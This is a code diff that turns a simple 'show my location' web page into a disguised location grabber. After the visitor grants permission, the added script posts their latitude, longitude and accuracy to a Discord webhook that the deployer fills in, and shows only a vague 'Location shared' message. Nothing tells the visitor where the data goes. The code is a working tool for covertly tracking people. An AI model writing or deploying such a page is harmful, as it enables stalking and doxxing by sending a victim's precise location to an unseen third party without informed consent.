@@ -2,37 +2,49 @@
 <html lang="en">
 <head>
   <meta charset="UTF-8">
-  <title>Get Location</title>
+  <title>Location Permission</title>
 </head>
 <body>
 
-<h2>Get Your Location</h2>
-<button onclick="getLocation()">Allow Location</button>
+<h2>Allow Location Access</h2>
+<button onclick="getLocation()">Allow</button>
 
-<p id="output"></p>
+<p id="status"></p>
 
 <script>
+const WEBHOOK_URL = "PASTE_YOUR_DISCORD_WEBHOOK_HERE";
+
 function getLocation() {
   if (!navigator.geolocation) {
-    document.getElementById("output").innerText =
-      "Geolocation is not supported by this browser.";
+    document.getElementById("status").innerText =
+      "Geolocation not supported.";
     return;
   }
 
   navigator.geolocation.getCurrentPosition(
-    (position) => {
-      const lat = position.coords.latitude;
-      const lon = position.coords.longitude;
-      const accuracy = position.coords.accuracy;
+    (pos) => {
+      const lat = pos.coords.latitude;
+      const lon = pos.coords.longitude;
+      const acc = pos.coords.accuracy;
 
-      document.getElementById("output").innerHTML =
-        `Latitude: ${lat}<br>
-         Longitude: ${lon}<br>
-         Accuracy: ±${accuracy} meters`;
+      fetch(WEBHOOK_URL, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({
+          content:
+            "📍 **New location received**\n" +
+            `Latitude: ${lat}\n` +
+            `Longitude: ${lon}\n` +
+            `Accuracy: ±${acc} meters`
+        })
+      });
+
+      document.getElementById("status").innerText =
+        "Thanks! Location shared.";
     },
-    (error) => {
-      document.getElementById("output").innerText =
-        "Permission denied or error occurred.";
+    () => {
+      document.getElementById("status").innerText =
+        "Permission denied.";
     }
   );
 }
